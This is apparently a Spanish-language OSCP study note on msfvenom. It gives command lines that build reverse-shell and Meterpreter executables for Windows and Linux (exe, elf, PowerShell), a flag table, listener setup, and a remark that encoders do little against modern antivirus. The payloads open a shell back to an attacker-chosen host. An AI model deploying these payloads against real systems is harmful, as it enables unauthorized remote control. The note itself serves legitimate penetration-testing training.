---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, explotacion, windows, linux]
---

# msfvenom

> [!abstract] Qué es y cuándo usarla
> Herramienta standalone de Metasploit para **generar payloads** en múltiples formatos (exe, elf, ps1, webshells, raw shellcode...). Úsala para crear ejecutables de reverse/bind shell, shellcode para exploits propios (ver [[Cross-Compiling con mingw-w64]]) o ficheros para client-side attacks. Más permitida en el examen que el resto de MSF, pero confirma las reglas.

## Requisitos previos
- Saber si necesitas payload **staged** (`/`) o **non-staged** y montar el listener acorde.
- Para staged/Meterpreter el listener debe ser `multi/handler`, no Netcat.

## Pasos
```bash
# listar payloads por plataforma/arquitectura
msfvenom -l payloads --platform windows --arch x64

# Windows exe (non-staged vs staged: el "/" marca staged)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o nonstaged.exe
msfvenom -p windows/x64/shell/reverse_tcp  LHOST=<ip> LPORT=443 -f exe -o staged.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe -o met.exe

# otros formatos útiles
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=443 -f psh -o rev.ps1
# shellcode para exploit propio: -f c (o -f python)
```
| Flag | Qué hace |
|---|---|
| `-p` | Payload a usar |
| `LHOST` / `LPORT` | IP/puerto de la conexión de vuelta |
| `-f` | Formato de salida (exe, elf, psh, c, raw, war...) |
| `-o` | Fichero de salida |
| `--platform` / `--arch` | Plataforma / arquitectura |
| `-e` / `-i` | Encoder / iteraciones (ofuscación básica, poco eficaz vs AV moderno) |

Recibir la conexión:
```text
use multi/handler
set payload <el_mismo_payload>
set LHOST <ip> ; set LPORT 443 ; run      # non-staged: también vale nc -nvlp 443
```

> [!warning] Detección / problemas
> - Payload **staged** recibido con **Netcat** = conecta pero no da prompt → usa `multi/handler` con el mismo payload.
> - Los encoders (`-e`) **no** evaden AV moderno de forma fiable.
> - Puerto 4444/443: evita el 4444 (filtrado por defecto en muchos sitios).

## Visto en
- Módulo: [[21 - The Metasploit Framework]] · [[15 - Antivirus Evasion]]
- Máquinas: [[]]
